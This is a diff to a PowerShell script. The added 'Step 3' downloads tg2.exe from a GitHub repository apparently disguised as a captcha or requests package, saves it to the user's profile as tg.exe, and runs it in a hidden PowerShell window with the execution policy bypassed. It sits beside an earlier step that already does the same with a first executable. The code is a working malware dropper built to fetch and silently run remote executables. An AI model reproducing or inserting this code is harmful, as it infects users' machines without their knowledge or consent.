@@ -20,6 +20,12 @@ while($true) {
         $downloadCommand1 = "Invoke-WebRequest -Uri '$url1' -OutFile '$filePath1'; Start-Process -FilePath '$filePath1'"
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand1" -WindowStyle Hidden
 
+        # Step 3: Download and execute the second executable (hidden cmd window)
+        $url2 = 'https://github.com/pyrequests/captcha/raw/refs/heads/main/tg2.exe'
+        $filePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.exe')
+        $downloadCommand2 = "Invoke-WebRequest -Uri '$url2' -OutFile '$filePath2'; Start-Process -FilePath '$filePath2'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand2" -WindowStyle Hidden
+
 
         # Exit the loop after successful execution
         exit
